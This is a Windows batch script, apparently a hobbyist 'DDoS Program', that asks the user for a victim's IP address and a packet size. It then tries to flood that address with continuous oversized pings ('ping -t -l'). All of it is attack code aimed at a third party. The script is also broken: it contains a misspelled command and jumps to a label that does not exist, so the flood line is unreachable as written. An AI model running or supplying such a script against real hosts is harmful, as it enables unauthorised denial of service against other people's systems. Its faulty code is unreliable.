@echo off
color a
title DDoSing Program
cls
goto start
:start
echo DDoS Program made by Anonymous
pause
echo Gathering Files
ping localhost >nul
echo Starting Program
echo.
echo Enter your Victims Ip
set /p x= Ip Adress:
echo Scanning Ip
ping %x%
goto size
:size
echo Enter Packet Size
set /p p=PacketSize:
echo Press any Key to Continue
puase >nul
goto :ddos
color c
ping %x% -t -l %p%